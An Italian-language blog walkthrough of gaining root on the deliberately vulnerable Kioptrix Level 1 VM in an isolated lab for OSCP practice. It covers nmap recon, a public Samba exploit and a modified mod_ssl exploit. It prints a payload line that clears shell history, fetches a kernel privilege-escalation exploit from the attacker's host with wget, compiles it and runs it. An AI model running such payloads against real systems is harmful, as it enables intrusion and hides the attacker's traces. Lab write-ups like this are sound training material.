---
layout: post
title: "Getting Root: Kioptrix livello 1"
exercise: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
level: SEMPLICE
promotion: 
modified: 
featured: false
category: [getting-root]
tags: [walkthrough, oscp, kioptrix, getting-root]
comments: true
share: true
---

Questa è la prima puntata di 'Getting Root', una serie di tutorial che mostrano
come compromettere macchine preparate _ad hoc_, per testare la parte di
sicurezza offensiva e prepararmi al secondo tentativo di OSCP.

## Prologo

Ci eravamo lasciati [un mese
fa]({{site:url}}/blog/alcune-lezioni-dal-primo-tentativo-fallito-per-loscp/) con
il racconto della lezione impartita dal primo fallimento all'esame per l'OSCP.

Nel corso di questo mese, mentre decidevo di quanti giorni estendere il
laboratorio, ho letto che il tasso di promozione è abbastanza basso, 4%.

Mi sono quindi detto _<<bene Paolo, sei proprio un grande xxx. Se non avessi
trascurato il report del laboratorio e gli esercizi, forse avresti tirato su
quei 5 punti mancanti...>>_.

Visto che coi se e coi ma non si fa la storia, l'esame è da ripetere e quindi,
sotto con la preparazione.

## Kioptrix Livello 1

Potendo scegliere con cosa partire, ho preferito curare l'autostima intaccata
dalla bocciatura al fil di lana, ed iniziare l'allenamento con qualcosa di
semplice: una [Kioptrix, Livello
1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

Questa macchina virtuale è un box Linux su cui è montata una distribuzione
RedHat obsoleta, con software vulnerabile, pensata proprio per essere bucata.

Nel mio percorso di avvicinamento al secondo tentativo per l'OSCP, mi sono
prefissato di simulare le condizioni di esame evitando quindi di usare
Metasploit, eccezion fatta per i tool come _msfvenom_, semplicemente
fondamentale.

### Setup dell'ambiente

Per iniziare, ho scaricato la [macchina
virtuale](http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar) e configurato
[VirtualBox](https://www.virtualbox.org) affinché esegua la mia [Kali
Linux](https://www.kali.org) e la macchina target in una rete ad hoc, isolata
dal mondo esterno.

Questo si ottiene andando sulle preferenze di Virtual Box, selezionando
_Network_ ed il tab _Host-only networks_.

![Impostazioni Virtual Box]({{site.url}}/assets/images/getting-root/k1/impostazioni_virtualbox.png)

Ora che tutte le macchine, all'avvio, prenderanno un indirizzo sulla 192.168.56
possiamo partire.

La macchina 192.168.56.101 è una Kali Linux aggiornata e pronta all'uso. Qui
non si fanno favoritismi, tutti i passaggi li potete seguire con un Linux a
scelta, con un Mac OS X o, se volete, anche con un Windows e l'ambiente Cygbin.

La macchina 192.168.56.102 è il target.

![La nostra vittima all'avvio]({{site.url}}/assets/images/getting-root/k1/target.png)

### Recon

Il primo passaggio è quello di enumerare i servizi in ascolto sulla macchina,
per cercare di capire qualcosa in più.

{%highlight sh%}
# nmap -A -T4 -oA 192.168.56.102 192.168.56.102
{%endhighlight%}

{% highlight sh %}
# Nmap 7.50 scan initiated Tue Sep  5 18:48:21 2017 as: nmap -A -T4 -oA 192.168.56.102 192.168.56.102
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.102
Host is up (0.00085s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1          32768/tcp  status
|_  100024  1          32770/udp  status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2017-09-05T20:48:40+00:00; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:BA:F2:F4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.85 ms 192.168.56.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  5 18:50:09 2017 -- 1 IP address (1 host up) scanned in 108.20 seconds

{%endhighlight%}

Abbiamo quindi, su questa macchina, un demone SSH, un server web (in ascolto
sia su protocollo HTTP che HTTPS), alcuni servizi RPC e Samba. Le versioni sono
tutte obsolete e pensate per essere bucate.

L'unica informazione che mi manca, dal primo giro di nmap, è la versione di
SAMBA in esecuzione. Usando il tool _smbclient_, riesco a rilevare che si
tratta della versione 2.2.1a.

![Esecuzione di smbclient]({{site.url}}/assets/images/getting-root/k1/smb_client.png)

### Exploit

#### SAMBA

Versioni dei servizi alla mano, proviamo a vedere se c'è qualche exploit
pubblico che possiamo sfruttare. Prima di cercare su Internet, proviamo a
chiedere a _searchexploit_.

_searchexploit_ è un tool disponibile nel pacchetto
[exploitdb](https://tools.kali.org/exploitation-tools/exploitdb), presente
sulla distribuzione Kali Linux. Con _searchexploit_ è possibile fare una
ricerca offline degli exploit disponibili per un certo software e pubblicati su
[exploit-db.com](https://www.exploit-db.com).

![ExploitDB per samba]({{site.url}}/assets/images/getting-root/k1/search_exp_samba2.png)

Essendo un test in preparazione all'OSCP, una regola che mi sono dato è: niente
Metasploit ad esclusione di msfvenom ed eventualmente pattern\_match e
pattern\_create.

Ho scaricato quindi l'exploit 22470.c dall'archivio locale del pacchetto
exploit_db e, senza bisogno di modifiche una volta compilato ed eseguito, una
shell di root è apparsa sotto ai miei polpastrelli.

![Shell di root]({{site.url}}/assets/images/getting-root/k1/root_1.png)

La flag era nella mailbox.

![Shell di root]({{site.url}}/assets/images/getting-root/k1/flag.png)

#### mod_ssl

Chi ha creato questa macchina virtuale ha specificato esserci più modi per
ottenere una shell di root. Proviamo a passare da mod_ssl che, in questa
versione, è vulnerabile ad una remote code execution.

![ExploitDB per samba]({{site.url}}/assets/images/getting-root/k1/search_exp_samba2.png)

Aprendo l'exploit, vediamo una nota, aggiunta a posteriori che ci rimanda a
[questo
post](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/) dove
possiamo seguire le istruzioni per una corretta compilazione.

Ho fatto un'ulteriore modifica all'exploit. Ad un certo punto, alla riga 666,
si fa il download di un
[exploit](https://packetstormsecurity.com/files/favorite/30973/) che sfrutta
una vulnerabilità nei vecchi kernel di Linux e che permette una privilege
escalation locale.

Visto che le macchine del mio laboratorio non possono uscire su Internet, ho
caricato sulla Kali l'exploit e l'ho spostato nella _/var/www/html_ in modo da
poterlo servire via HTTP.

{% highlight c %}
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://192.168.56.101/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
{% endhighlight %}

Dopo le modifiche, il nostro exploit si compila senza neanche un warning ed è
pronto per essere eseguito.

![Compiliamo il nostro exploit]({{site.url}}/assets/images/getting-root/k1/openfuck_good_compile.png)

Lanciato l'exploit, abbiamo i due stadi dell'attacco: la shell locale e
l'upload dell'exploit per la privilege escalation che ci regala una shell di
root .

![Seconda shell di root]({{site.url}}/assets/images/getting-root/k1/root_2.png)

## Off by one

Questa era una macchina semplice. Sicuramente molto lontana da quelle che ho
trovato durante l'esame. Mi serviva però qualcosa per aumentare un po'
l'autostima. Root alla mano, siamo pronti per una seconda macchina con cui
allenarci...

Enjoy it!
